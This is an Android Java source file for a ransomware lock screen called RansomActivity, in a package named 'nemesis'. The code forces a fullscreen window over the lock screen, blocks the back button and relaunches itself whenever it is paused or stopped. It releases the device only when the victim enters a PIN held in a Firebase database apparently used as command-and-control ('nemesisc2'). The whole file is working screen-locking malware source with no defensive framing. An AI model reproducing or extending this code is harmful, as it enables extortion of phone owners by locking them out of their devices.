package com.nemesis;

import android.os.Bundle;
import android.os.Handler;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.*;

public class RansomActivity extends AppCompatActivity {

    private EditText etPin;
    private Button btnConfirm;
    private DatabaseReference settingsRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ransom);

        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        etPin = findViewById(R.id.etPin);
        btnConfirm = findViewById(R.id.btnConfirm);

        String url = "https://nemesisc2-default-rtdb.firebaseio.com/";
        settingsRef = FirebaseDatabase.getInstance(url).getReference("settings");

        btnConfirm.setOnClickListener(v -> {
            String inputPin = etPin.getText().toString();

            settingsRef.child("pin").addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot snapshot) {
                    String correctPin = snapshot.getValue(String.class);
                    if (inputPin.equals(correctPin)) {
                        Toast.makeText(RansomActivity.this, "✅ PIN BENAR!", Toast.LENGTH_SHORT).show();
                        finishAffinity();
                    } else {
                        Toast.makeText(RansomActivity.this, "❌ PIN SALAH!", Toast.LENGTH_SHORT).show();
                        etPin.setText("");
                    }
                }

                @Override
                public void onCancelled(DatabaseError error) {
                    Toast.makeText(RansomActivity.this, "Error: " + error.getMessage(), Toast.LENGTH_SHORT).show();
                }
            });
        });
    }

    @Override
    public void onBackPressed() {}

    @Override
    protected void onPause() {
        super.onPause();
        new Handler().postDelayed(() -> {
            finish();
            startActivity(getIntent());
        }, 100);
    }

    @Override
    protected void onStop() {
        super.onStop();
        finish();
        startActivity(getIntent());
    }
}
